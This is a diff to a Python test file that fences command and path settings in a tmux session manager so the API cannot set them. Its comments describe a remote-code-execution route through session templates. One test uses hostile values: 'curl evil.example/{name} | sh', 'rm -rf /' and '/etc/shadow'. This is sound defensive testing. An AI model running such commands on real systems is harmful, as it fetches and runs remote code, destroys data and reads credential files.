@@ -11,6 +11,7 @@ import pytest
 import muxplex.settings as settings_mod
 from muxplex.settings import (
     DEFAULT_SETTINGS,
+    LOCAL_ONLY_KEYS,
     SYNCABLE_KEYS,
     DestructiveSettingsWriteRejected,
     apply_synced_settings,
@@ -20,7 +21,6 @@ from muxplex.settings import (
     patch_settings,
     save_settings,
 )
-
 
 # ---------------------------------------------------------------------------
 # Autouse fixture: redirect SETTINGS_PATH to tmp_path
@@ -353,16 +353,110 @@ def test_delete_session_template_returned_by_load_settings():
     )
 
 
-def test_delete_session_template_patchable():
-    """patch_settings() must accept and persist delete_session_template."""
+def test_delete_session_template_not_patchable():
+    """SECURITY: delete_session_template is a server-side shell command
+    (settings.LOCAL_ONLY_KEYS) -- PATCH /api/settings must silently ignore it
+    rather than accept it. See settings.LOCAL_ONLY_KEYS's module comment for
+    the RCE this closes (Bearer-key holder rewrites the template, then POSTs
+    a session to trigger it)."""
     custom = "amplifier-dev ~/dev/{name} --destroy"
     result = patch_settings({"delete_session_template": custom})
-    assert result["delete_session_template"] == custom, (
-        f"patch_settings() must accept delete_session_template, got: {result['delete_session_template']!r}"
+    assert result["delete_session_template"] != custom, (
+        "patch_settings() must NOT accept delete_session_template from the API "
+        f"(settings.LOCAL_ONLY_KEYS), got: {result['delete_session_template']!r}"
     )
-    # Verify it was persisted
+    assert (
+        result["delete_session_template"] == DEFAULT_SETTINGS["delete_session_template"]
+    )
+    # Verify the default was persisted, not the rejected value.
     loaded = load_settings()
-    assert loaded["delete_session_template"] == custom
+    assert loaded["delete_session_template"] != custom
+
+
+# ============================================================
+# Security fence: LOCAL_ONLY_KEYS widened to command/path settings
+#
+# Incident: a client holding only the federation Bearer key (no PAM login)
+# could PATCH new_session_template/delete_session_template to an arbitrary
+# shell command, then POST /api/sessions to trigger it -- full RCE that
+# never touches the fenced POST /api/sessions/{name}/input endpoint.
+# tmux_socket_dir (fed into every tmux invocation as TMUX_TMPDIR) and
+# tls_cert/tls_key (paths the server later reads/parses) are the same shape
+# of hazard: a command or path value a remote caller must never set.
+# ============================================================
+
+_NEWLY_FENCED_KEYS = (
+    "new_session_template",
+    "delete_session_template",
+    "tmux_socket_dir",
+    "tls_cert",
+    "tls_key",
+)
+
+
+@pytest.mark.parametrize("key", _NEWLY_FENCED_KEYS)
+def test_newly_fenced_keys_are_local_only(key):
+    """Each of the five newly-fenced keys must be in LOCAL_ONLY_KEYS and absent
+    from SYNCABLE_KEYS (federation sync must never widen a local-only fence)."""
+    assert key in LOCAL_ONLY_KEYS, f"{key!r} must be in LOCAL_ONLY_KEYS"
+    assert key not in SYNCABLE_KEYS, f"{key!r} must NOT be in SYNCABLE_KEYS"
+
+
+@pytest.mark.parametrize("key", _NEWLY_FENCED_KEYS)
+def test_newly_fenced_keys_not_patchable_via_api(key):
+    """PATCH /api/settings (patch_settings()) must silently ignore each of the
+    five newly-fenced keys -- the value sent is never applied."""
+    custom = "attacker-controlled-value"
+    result = patch_settings({key: custom})
+    assert result[key] != custom, (
+        f"patch_settings() must not accept {key!r} from the API, got: {result[key]!r}"
+    )
+    assert result[key] == DEFAULT_SETTINGS[key]
+    loaded = load_settings()
+    assert loaded[key] != custom
+
+
+def test_newly_fenced_keys_ignored_but_rest_of_patch_still_applies():
+    """A PATCH touching a newly-fenced key alongside an ordinary key must skip
+    ONLY the fenced key and still apply the rest of the patch (the existing
+    'skip the key but apply the rest' behavior documented in
+    patch_settings())."""
+    result = patch_settings(
+        {
+            "new_session_template": "rm -rf / #{name}",
+            "delete_session_template": "curl evil.example/{name} | sh",
+            "tmux_socket_dir": "/tmp/attacker",
+            "tls_cert": "/etc/shadow",
+            "tls_key": "/etc/shadow",
+            "sort_order": "alpha",
+        }
+    )
+    for key in _NEWLY_FENCED_KEYS:
+        assert result[key] == DEFAULT_SETTINGS[key], (
+            f"{key!r} must be ignored even when patched alongside other keys"
+        )
+    assert result["sort_order"] == "alpha", (
+        "Non-fenced keys in the same PATCH must still apply"
+    )
+    loaded = load_settings()
+    assert loaded["sort_order"] == "alpha"
+    for key in _NEWLY_FENCED_KEYS:
+        assert loaded[key] == DEFAULT_SETTINGS[key]
+
+
+@pytest.mark.parametrize("key", _NEWLY_FENCED_KEYS)
+def test_newly_fenced_keys_settable_via_local_settings_json(key, tmp_path, monkeypatch):
+    """The legitimate operator path -- editing ~/.config/muxplex/settings.json
+    directly -- must still work for every newly-fenced key. This exercises
+    save_settings()/load_settings() rather than patch_settings(), mirroring
+    how a local file edit takes effect (load_settings() merges saved values
+    over defaults with no LOCAL_ONLY_KEYS filtering)."""
+    custom = "/local/operator/value"
+    save_settings({key: custom})
+    loaded = load_settings()
+    assert loaded[key] == custom, (
+        f"Editing settings.json directly must still set {key!r}, got: {loaded[key]!r}"
+    )
 
 
 # ============================================================
@@ -784,21 +878,28 @@ def test_load_returns_tls_keys_when_file_missing():
     )
 
 
-def test_tls_keys_patchable():
-    """patch_settings() must accept and persist tls_cert and tls_key."""
+def test_tls_keys_not_patchable_via_api():
+    """SECURITY: tls_cert and tls_key are filesystem paths the server later
+    reads/parses (cli.py). They are in settings.LOCAL_ONLY_KEYS, so
+    PATCH /api/settings (patch_settings()) must silently ignore them rather
+    than accept them -- an unauthenticated PATCH must not be able to point
+    the server at an arbitrary file to read. Setting them locally still works
+    via save_settings()/settings.json (see
+    test_newly_fenced_keys_settable_via_local_settings_json); the local CLI
+    command `muxplex setup-tls` writes through save_settings() directly for
+    exactly this reason."""
     result = patch_settings(
         {"tls_cert": "/etc/ssl/cert.pem", "tls_key": "/etc/ssl/key.pem"}
     )
-    assert result["tls_cert"] == "/etc/ssl/cert.pem", (
-        f"patch_settings() must accept tls_cert, got: {result['tls_cert']!r}"
+    assert result["tls_cert"] != "/etc/ssl/cert.pem", (
+        f"patch_settings() must NOT accept tls_cert from the API, got: {result['tls_cert']!r}"
     )
-    assert result["tls_key"] == "/etc/ssl/key.pem", (
-        f"patch_settings() must accept tls_key, got: {result['tls_key']!r}"
+    assert result["tls_key"] != "/etc/ssl/key.pem", (
+        f"patch_settings() must NOT accept tls_key from the API, got: {result['tls_key']!r}"
     )
-    # Verify persistence via load_settings()
     loaded = load_settings()
-    assert loaded["tls_cert"] == "/etc/ssl/cert.pem"
-    assert loaded["tls_key"] == "/etc/ssl/key.pem"
+    assert loaded["tls_cert"] != "/etc/ssl/cert.pem"
+    assert loaded["tls_key"] != "/etc/ssl/key.pem"
 
 
 def test_old_settings_file_without_tls_keys_loads_correctly(redirect_settings_path):
